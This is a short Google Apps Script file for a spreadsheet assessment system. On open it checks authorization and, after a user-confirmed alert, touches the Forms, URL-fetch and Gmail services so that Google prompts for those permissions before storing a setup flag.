
// === auth.gs ===
function onOpen() {
  Logger.log("=== Starting Silent Auth Check ===");
  
  try {
    var props = PropertiesService.getScriptProperties();
    Logger.log("✓ Basic authorization present");
  } catch(e) {
    Logger.log("✗ No authorization - showing prompt");
    showAuthorizationPrompt();
  }
}

function showAuthorizationPrompt() {
  var ui = SpreadsheetApp.getUi();
  var response = ui.alert(
    'Assessment System Setup',
    'This sheet requires setup to handle form responses. Click OK to proceed.',
    ui.ButtonSet.OK_CANCEL
  );
  
  if (response === ui.Button.OK) {
    Logger.log("User agreed to setup - triggering authorization");
    triggerFullAuthorization();
  }
}

function triggerFullAuthorization() {
  Logger.log("=== Requesting Full Authorization ===");
  
  try {
    FormApp.getActiveForm();
    UrlFetchApp.fetch('https://www.google.com');
    GmailApp.getQuota();
    
    Logger.log("✓ Full authorization granted");
    PropertiesService.getScriptProperties().setProperty('initialized', 'true');
  } catch(e) {
    Logger.log("! Authorization process initiated: " + e.toString());
  }
}